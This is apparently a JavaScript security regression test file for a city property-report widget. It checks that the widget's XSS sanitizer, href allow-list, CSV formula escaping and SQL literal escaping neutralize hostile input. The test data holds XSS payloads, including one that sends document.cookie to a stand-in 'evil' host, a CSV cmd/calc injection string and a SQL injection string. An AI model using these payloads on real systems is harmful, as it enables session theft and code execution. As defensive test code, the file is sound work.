// Security regression tests for the Property Report widget.
//
// Covers the stored XSS fix in rich text placeholder substitution, the href
// scheme allow-list, CSV formula injection and SQL literal escaping. The XSS
// assertions are DOM-based on purpose: escaped entities legitimately contain
// strings like "onerror=" as inert text, so a substring check on the serialized
// HTML gives false failures. What matters is whether the browser builds a
// dangerous node or attribute.
//
// Run with: node --experimental-strip-types test/security.test.mjs
// (requires jsdom and the widget's dompurify dependency to be installed)

// Verifies the actual security helpers the widget now uses, in a real DOM.
import { JSDOM } from 'jsdom'
const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'https://maps.gjcity.org/app/' })
globalThis.window = dom.window
globalThis.document = dom.window.document
globalThis.DOMParser = dom.window.DOMParser
globalThis.Node = dom.window.Node
globalThis.HTMLElement = dom.window.HTMLElement
globalThis.Element = dom.window.Element
globalThis.trustedTypes = undefined

const { escapeHtml, sanitizeHtml, htmlToPlainText } = await import('../src/runtime/utils/html.ts')
const { toSafeHref } = await import('../src/runtime/utils/safeUrl.ts')
const { csvEscape } = await import('../src/runtime/utils/csv.ts')
const { escapeSqlLiteral } = await import('../src/runtime/utils/sql.ts')

let pass = 0, fail = 0
const check = (name, cond, detail = '') => {
  if (cond) { pass++; console.log('  PASS ', name) }
  else { fail++; console.log('  FAIL ', name, detail) }
}

console.log('\n--- Stored XSS: attacker-controlled field value substituted into rich text HTML ---')
// This mirrors replacePlaceholdersForHtml: escape the value, then sanitize the result.
const render = (template, fields) => sanitizeHtml(
  template.replace(/\{([^}]+)\}/g, (m, f) => {
    const k = String(f).trim()
    return k in fields && fields[k] != null ? escapeHtml(fields[k]) : m
  })
)

const payloads = [
  '<img src=x onerror=alert(1)>',
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "<svg/onload=alert(1)>",
  '<iframe src="javascript:alert(1)">',
  '<a href="javascript:alert(1)">x</a>',
  '<div onclick="alert(1)">x</div>',
  '<body onload=alert(1)>',
  '<style>@import"x"</style>',
  '<img src="x" onerror="fetch(`//evil/`+document.cookie)">'
]
// The correct criterion is what the browser actually BUILDS, not whether the
// serialized string contains the substring. Escaped entities are inert text.
const domIsDangerous = (html) => {
  const host = document.createElement('div')
  host.innerHTML = html
  if (host.querySelector('script, iframe, style, object, embed, form, svg')) return 'dangerous element'
  for (const el of host.querySelectorAll('*')) {
    for (const attr of Array.from(el.attributes)) {
      if (/^on/i.test(attr.name)) return `event handler ${attr.name}`
      if (/^\s*(javascript|data|vbscript):/i.test(attr.value) && /^(href|src|action|formaction)$/i.test(attr.name)) {
        return `${attr.name}=${attr.value.slice(0, 30)}`
      }
    }
  }
  return null
}
for (const p of payloads) {
  const out = render('<p>Owner: {OWNER}</p>', { OWNER: p })
  const danger = domIsDangerous(out)
  // Also assert the payload survives as visible text, so data is not silently dropped.
  const host = document.createElement('div'); host.innerHTML = out
  const asText = host.textContent.includes(p)
  check(`inert: ${p.slice(0, 40)}`, !danger, `-> ${danger} :: ${out.slice(0, 80)}`)
  check(`  preserved as literal text`, asText, `text was: ${host.textContent.slice(0, 70)}`)
}

console.log('\n--- Sanitizer strips dangerous markup authored directly in config (not via placeholder) ---')
for (const p of payloads) {
  const out = sanitizeHtml('<p>Note: ' + p + '</p>')
  const danger = domIsDangerous(out)
  check(`config-authored neutralized: ${p.slice(0, 34)}`, !danger, `-> ${danger} :: ${out.slice(0, 80)}`)
}

console.log('\n--- Sanitizer still allows legitimate authored rich text ---')
const legit = sanitizeHtml('<p>Call <strong>Planning</strong> at <a href="tel:9702441430">970-244-1430</a> or see <a href="https://gjcity.org" target="_blank">the site</a>.</p>')
check('keeps p/strong/a', /<strong>Planning<\/strong>/.test(legit) && /tel:9702441430/.test(legit), legit)
check('adds rel=noopener on target=_blank', /rel="noopener noreferrer"/.test(legit), legit)

console.log('\n--- href allow-list ---')
const hrefCases = [
  ['javascript:alert(1)', undefined], ['JaVaScRiPt:alert(1)', undefined],
  ['  javascript:alert(1)  ', undefined], ['data:text/html,<script>alert(1)</script>', undefined],
  ['vbscript:msgbox(1)', undefined], ['file:///etc/passwd', undefined],
  ['https://gjcity.org/parcel?id=1#x', 'https://gjcity.org/parcel?id=1#x'],
  ['http://gjcity.org', 'http://gjcity.org'],
  ['mailto:planning@gjcity.org', 'mailto:planning@gjcity.org'],
  ['tel:+19702441430', 'tel:+19702441430'],
  ['', undefined], [null, undefined], [undefined, undefined]
]
for (const [input, want] of hrefCases) {
  const got = toSafeHref(input)
  check(`toSafeHref(${JSON.stringify(input)}) -> ${JSON.stringify(want)}`, got === want, `got ${JSON.stringify(got)}`)
}
// tab-obfuscated scheme
check('rejects tab-obfuscated javascript:', toSafeHref('java\tscript:alert(1)') === undefined)

console.log('\n--- CSV formula injection ---')
for (const v of ['=cmd|\' /C calc\'!A0', '+1+1', '-2+3', '@SUM(A1)', '=HYPERLINK("http://evil","x")']) {
  const out = csvEscape(v)
  check(`neutralized cell ${JSON.stringify(v.slice(0,20))}`, !/^[=+\-@]/.test(out.replace(/^"/, '')), `-> ${out}`)
}
check('normal value untouched', csvEscape('Main St') === 'Main St', csvEscape('Main St'))
check('comma still quoted', csvEscape('a,b') === '"a,b"', csvEscape('a,b'))

console.log('\n--- SQL literal escaping ---')
check("O'Brien doubled", escapeSqlLiteral("O'Brien") === "O''Brien", escapeSqlLiteral("O'Brien"))
check("injection attempt neutralized", escapeSqlLiteral("x' OR '1'='1") === "x'' OR ''1''=''1")

console.log('\n--- htmlToPlainText (PDF path) does not execute or leak tags ---')
const pt = htmlToPlainText('<p>Line1</p><li>Item</li><script>alert(1)</script>')
check('no tags in plain text', !/[<>]/.test(pt), pt)
check('block elements separated', /Line1/.test(pt) && /Item/.test(pt), JSON.stringify(pt))

console.log(`\n===== ${pass} passed, ${fail} failed =====`)
process.exit(fail ? 1 : 0)
